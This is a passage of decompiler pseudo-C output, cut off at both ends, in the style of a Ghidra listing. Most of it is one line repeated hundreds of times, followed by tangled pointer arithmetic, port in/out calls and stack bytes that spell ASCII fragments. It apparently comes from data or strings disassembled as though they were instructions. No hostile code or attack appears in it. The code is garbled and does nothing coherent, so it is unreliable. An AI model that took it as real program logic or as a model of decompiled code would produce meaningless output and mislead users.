uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                uVar53 = CARRY1(*piVar45, uVar10);\n                *piVar45 = *piVar45 + uVar10;\n                if (uVar53) {\n                    puVar14 = piVar45 + 3;\n                    *(piVar45 + puVar27 + 0x11) = *(piVar45 + puVar27 + 0x11) + (uVar57 >> 0x20);\n                    uVar53 = puVar14;\n                    *puVar14 = *puVar14 + uVar53;\n                    in_AF = 9 < (uVar53 & 0xf) | in_AF;\n                    uVar25 = CONCAT11((puVar14 >> 8) - in_AF, uVar53 + in_AF * -6) & 0xff0f;\n                    piVar19 = puVar14 & 0xffff0000 | uVar25;\n                    puVar26 = puVar27 + 1;\n                    piVar13 = piVar13 & 0xff | piVar45 << 8;\n                    uVar59 = uVar57 >> 0x18;\n                    cVar7 = puVar26 >> 8;\n                    uVar53 = uVar25;\n                    if (in_AF) {\n                        if (!in_AF) {\n                            *piVar19 = *piVar19 + uVar53;\ncode_r0x0046c084:\n                            piVar19 = piVar19 + 2;\n                            pcVar44 = uVar57 + (puVar26 + 0x11) * 4;\n                            *pcVar44 = *pcVar44 + (uVar57 >> 0x20);\n                            *piVar19 = *piVar19 + piVar19;\n                            piVar33 = piVar34;\n                            puVar39 = puVar40;\n                            goto code_r0x0046c090;\n                        }\n                        uVar28 = uVar57 >> 0x20;\n                        iVar46 = in(uVar28);\n                        *piVar51 = iVar46;\n                        piVar33 = piVar34;\n                        puVar39 = &stack0xfffffffc;\n                        if (in_AF) goto code_r0x0046c090;\n                        piVar33 = piVar45 + 1;\n                        out(*piVar45, uVar28);\n                        if (in_AF) {\n                            if (puVar26 == NULL) {\n                                piVar51 = CONCAT13(in_stack_0000000c, \n                                                   CONCAT12(in_stack_0000000b, \n                                                            CONCAT11(in_stack_0000000a, in_stack_00000009)));\n                                uVar18 = in_stack_0000005e * 0x6675;\n                                puVar14 = piVar19 + 1;\n                                puVar15 = piVar51 + 0x66;\n                                *puVar15 = *puVar15 + (uVar18 != uVar18) * (1 - (*puVar15 & 3));\n                                puVar41 = *((&stack0xfffffffc & 0xffff0000 | uVar18 & 0xffff) + 0x62) * 0x44406675;\n                                in_stack_0000000d = puVar41;\n                                in_stack_0000000e = puVar41 >> 8;\n                                in_stack_0000000f = puVar41 >> 0x10;\n                                in_stack_00000010 = puVar41 >> 0x18;\n                                in_AF = 9 < (puVar14 & 0xf) | in_AF;\n                                puVar16 = puVar14 & 0xffff0000 |\n                                          (CONCAT11((puVar14 >> 8) - in_AF, puVar14 + in_AF * -6) & 0xff0f) & 0xffffff63\n                                ;\n                                in_stack_00000009 = 'a';\n                                in_stack_0000000a = 'r';\n                                in_stack_0000000b = 0x5f;\n                                in_stack_0000000c = 0x74;\n                                iVar3 = *(piVar33 * 2 + 0x41) * 0x74734044;\n                                piVar45 = iVar3;\n                                uVar53 = piVar45 != iVar3;\n                                puVar27 = puVar26;\n                                goto code_r0x0046c0f4;\n                            }\n                            puVar41 = CONCAT13(var_4h._3_1_, CONCAT12(var_4h._2_1_, CONCAT11(var_4h._1_1_, var_4h)));\n                            piVar34 = CONCAT13(unaff_retaddr_01, CONCAT21(unaff_retaddr_00, unaff_retaddr));\n                            puVar27 = CONCAT13(in_stack_0000000b, \n                                               CONCAT12(in_stack_0000000a, \n                                                        CONCAT11(in_stack_00000009, in_stack_00000008)));\n                            piVar51 = unaff_ESI + 1;\n                            uVar31 = in(arg_8h);\n                            *unaff_ESI = uVar31;\n                            uVar18 = CONCAT13(in_stack_0000000f, \n                                              CONCAT12(in_stack_0000000e, CONCAT11(in_stack_0000000d, in_stack_0000000c)\n                                                      )) + 1;\n                            in_stack_0000000d = var_4h;\n                            in_stack_0000000e = var_4h._1_1_;\n                            in_stack_0000000f = var_4h._2_1_;\n                            in_stack_00000010 = var_4h._3_1_;\n                            in_AF = 9 < (uVar18 & 0xf) | in_AF;\n                            puVar16 = uVar18 & 0xffff0000 |\n                                      (CONCAT11((uVar18 >> 8) - in_AF, uVar18 + in_AF * -6) & 0xff0f) & 0xffffff63;\n                            in_stack_00000009 = 'a';\n                            in_stack_0000000a = 'r';\n                            in_stack_0000000b = 0x5f;\n                            in_stack_0000000c = 0x74;\n                            iVar3 = *(piVar34 + var_8h * 2 + 0x40) * 0x74734044;\n                            piVar45 = iVar3;\n                            uVar53 = piVar45 != iVar3;\n                            piVar52 = arg_8h;\n                            goto code_r0x0046c07e;\n                        }\n                        puVar39 = &stack0xfffffffc;\n                        uVar53 = in_AF;\n                        uVar4 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar33);\n                        if (!in_AF) goto code_r0x0046c097;\n                        puVar15 = piVar19 + 2;\n                        *puVar15 = *puVar15 + puVar15;\n                        cVar8 = cVar8 + -0x2b;\n                        *piVar33 = *piVar33 + cVar7;\n                        *(piVar19 + -2) = piVar33;\n                        piVar45 = piVar33 & 0xffff0000 | *piVar19;\n                        piVar34 = *(piVar19 + 6);\n                        piVar52 = (uVar57 & 0xffff0000ffff0000) >> 0x20 | *(piVar19 + 2);\n                        uVar25 = *(piVar19 + 10);\n                        puVar26 = puVar27 + 2U & 0xffff0000 | uVar25;\n                        puVar14 = &stack0xffffffd5 & 0xffff0000 | *(piVar19 + 3);\n                        iVar3 = *((&stack0xfffffffc & 0xffff0000 | *puVar15) + 0x72 + piVar45 * 2) * 0x6f694065;\n                        puVar39 = iVar3;\n                        uVar53 = puVar39 != iVar3;\n                        if (!uVar53) goto code_r0x0046c09f;\n                        puVar16 = puVar14 + 1;\n                        bVar54 = puVar16 == NULL;\n                        puVar27 = puVar26;\n                        piVar51 = uVar57 & 0xffff0000ffff0000 | *(piVar19 + -2);\n                        if (!uVar53) goto code_r0x0046c0bb;\n                        ppcVar17 = puVar14 + 3;\n                        *ppcVar17 = *ppcVar17 + ppcVar17;\n                        in_stack_00000009 = in_stack_00000009 + '\\t';\n                        *piVar45 = *piVar45 + (uVar25 >> 8);\n                        *(puVar14 + -1) = piVar45;\n                        in_AF = 9 < (in_AF * -6 + 9 & 0xf) | in_AF;\n                        pcVar44 = *ppcVar17;\n                        puVar27 = *(puVar14 + 0x17);\n                        puVar16 = *(puVar14 + 0x1b);\n                        *puVar16 = *puVar16 + puVar16;\ncode_r0x0046c0bf:\n                        ppcVar17 = puVar16 + 1;\n                        *ppcVar17 = *ppcVar17 + ppcVar17;\n                        unaff_ESI = unaff_ESI - 0x10;\n                        *pcVar44 = *pcVar44 + (puVar27 >> 8);\n                        *(puVar16 + -1) = pcVar44;\n                        in_AF = 9 < (in_AF * -6 - 0x10 & 0xf) | in_AF;\n                        pcVar44 = *ppcVar17;\n                        puVar27 = *(puVar16 + 0xb);\n                        puVar16 = *(puVar16 + 0xd);\n                        *puVar16 = *puVar16 + puVar16;\ncode_r0x0046c137:\n                        ppiVar20 = puVar16 + 1;\n                        *ppiVar20 = *ppiVar20 + ppiVar20;\n                        in_stack_00000011 = in_stack_00000011 + '\\x11';\n                        *pcVar44 = *pcVar44 + (puVar27 >> 8);\n                        *(puVar16 + -1) = pcVar44;\n                        piVar33 = *ppiVar20;\n                        pcVar44 = *(puVar16 + 0xd);\n                        uVar53 = pcVar44;\n                        *(piVar33 + *(puVar16 + 0xb) + 0x11) = *(piVar33 + *(puVar16 + 0xb) + 0x11) + *(puVar16 + 9);\n                        *pcVar44 = *pcVar44 + uVar53;\n                        in_AF = 9 < (uVar53 & 0xf) | 9 < (in_AF * -6 + 0x11 & 0xf) | in_AF;\n                        uVar53 = uVar53 + in_AF * -6;\ncode_r0x0046c1c2:\n                        unaff_ESI = unaff_ESI & 0xff | piVar33 << 8;\n                        uVar18 = var_8h & 0xffffff00;\n                        var_8h = uVar18 | piVar33 >> 0x18;\n                        in_AF = 9 < (uVar53 & 0xf) | in_AF;\n                        bVar54 = ((uVar53 & 0xf) + in_AF * -6 & 2) != 0;\n                        uVar53 = false;\n                        var_8h._1_3_ = uVar18 >> 8;\n                        puVar5 = CONCAT13(var_4h, var_8h._1_3_);\n                        puVar43 = CONCAT13(uStack4, CONCAT12(var_4h._3_1_, CONCAT11(var_4h._2_1_, var_4h._1_1_)));\n                        piVar34 = CONCAT13(arg_8h._0_1_, CONCAT12(unaff_retaddr_01, unaff_retaddr_00));\n                        uVar31 = CONCAT13(in_stack_00000008, CONCAT12(arg_8h._3_1_, arg_8h._1_2_));\n                        puVar27 = CONCAT13(in_stack_0000000c, \n                                           CONCAT12(in_stack_0000000b, CONCAT11(in_stack_0000000a, in_stack_00000009)));\n                        pcVar21 = CONCAT13(in_stack_00000010, \n                                           CONCAT12(in_stack_0000000f, CONCAT11(in_stack_0000000e, in_stack_0000000d)));\n                        if (bVar54) {\n                            piVar51 = CONCAT13(in_stack_00000014, CONCAT21(in_stack_00000012, in_stack_00000011));\n                            iVar46 = CONCAT13(in_stack_00000018, CONCAT21(in_stack_00000016, in_stack_00000015));\n                            uVar30 = CONCAT13(in_stack_00000028, CONCAT21(in_stack_00000026, in_stack_00000025));\n                            uVar18 = CONCAT13(in_stack_00000030, \n                                              CONCAT12(in_stack_0000002f, CONCAT11(in_stack_0000002e, in_stack_0000002d)\n                                                      ));\ncode_r0x0046c236:\n                            puVar43 = CONCAT13(in_stack_0000001c, CONCAT21(in_stack_0000001a, in_stack_00000019));\n                            piVar34 = CONCAT13(in_stack_00000024, CONCAT21(in_stack_00000022, in_stack_00000021));\n                            puVar27 = CONCAT13(in_stack_0000002c, CONCAT21(in_stack_0000002a, in_stack_00000029));\n                            iVar46 = *(piVar34 + iVar46 * 2 + 0x40) * 0x74734044;\n                            uVar57 = CONCAT44(uVar30, iVar46);\n                            uVar18 = uVar18 + 2;\n                            uVar61 = iVar46;\n                            uVar62 = iVar46 >> 8;\n                            uVar29 = iVar46 >> 0x10;\n                            in_AF = 9 < (uVar18 & 0xf) | in_AF;\n                            puVar14 = uVar18 & 0xffff0000 | CONCAT11((uVar18 >> 8) - in_AF, uVar18) & 0xff0f;\ncode_r0x0046c243:\n                            puVar58 = uVar57;\n                            puVar23 = piVar51 + 1;\n                            uVar28 = uVar57 >> 0x20;\n                            uVar53 = in(uVar28);\n                            *piVar51 = uVar53;\n                            piVar51 = piVar51 + 2;\n                            uVar53 = in(uVar28);\n                            *puVar23 = uVar53;\n                            out(*puVar58, uVar28);\n                            *(puVar27 + 0x1d) = *(puVar27 + 0x1d);\n                            uVar57 = uVar57 & 0xffffffff00000000 | ZEXT48(puVar58 + 2);\n                            out(puVar58[1], uVar28);\n                            uVar18 = (puVar14 & 0xffffff61) + 1;\n                            puVar47 = uVar18 & 0xffffff00 | uVar18 ^ *((puVar14 & 0xffffff61) + 0x41);\n                            uVar53 = &stack0xffffffd0 != *(piVar34 + 0x5f) * 0x69727473;\ncode_r0x0046c2d0:\n                            uVar31 = uVar57 >> 0x20;\n                            piVar52 = uVar57 + 1;\n                            uVar6 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar52);\n                            uVar4 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar52);\n                            out(*uVar57, uVar57 >> 0x20);\n                            if (uVar53) {\n                                puVar58 = puVar47;\n                                in_stack_ffffffc8 = puVar27;\n                                piStackY64 = piVar34;\n                                puStackY72 = puVar43;\n                                piVar33 = piVar51;\n                                if (!uVar53) {\n                                    uVar57 = CONCAT44(uVar12, CONCAT13(uVar61, CONCAT12(uVar60, CONCAT11(cVar8, uVar59))\n                                                                      ));\n                                    puVar26 = CONCAT13(uVar63, CONCAT21(uVar29, uVar62));\n                                    iVar46 = in(uVar12);\n                                    *piVar13 = iVar46;\n                                    in_stack_00000032 = CONCAT21(uVar29, uVar62);\n                                    in_stack_00000034 = puVar26 >> 0x10;\n                                    pcVar44 = (CONCAT11(-0x16 - in_AF, in_AF * -6 + 'a') & 0xff0f) & 0xffffff63;\n                                    puVar27 = puStack24;\n                                    piVar34 = arg_8h;\n                                    piVar51 = piVar13 + 1;\ncode_r0x0046c2de:\n                                    piVar33 = piVar51;\n                                    in_stack_ffffffc8 = puVar27;\n                                    in_stack_0000002e = 0x61;\n                                    in_stack_0000002f = 0x72;\n                                    in_stack_00000030 = 0x5f;\n                                    in_stack_00000031 = 0x74;\n                                    in_stack_00000031 = 0x74;\n                                    in_stack_00000030 = 0x5f;\n                                    in_stack_0000002f = 0x72;\n                                    in_stack_0000002e = 'a';\n                                    uVar18 = *(piVar34 + uVar57 * 2 + 0x40) * 